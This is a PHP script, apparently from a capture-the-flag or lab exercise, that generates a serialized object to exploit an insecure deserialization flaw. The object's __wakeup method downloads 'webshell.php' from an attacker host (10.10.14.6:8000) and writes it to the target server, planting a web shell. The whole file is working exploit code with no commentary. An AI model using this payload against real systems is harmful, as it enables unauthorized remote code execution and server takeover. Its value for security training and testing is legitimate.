<?php

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}


class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$avinterface = new AvatarInterface();
$avinterface->tmp = "http://10.10.14.6:8000/webshell.php";
$avinterface->imgPath = "webshell.php"; 
$serialized = serialize($avinterface);
print($serialized);


?>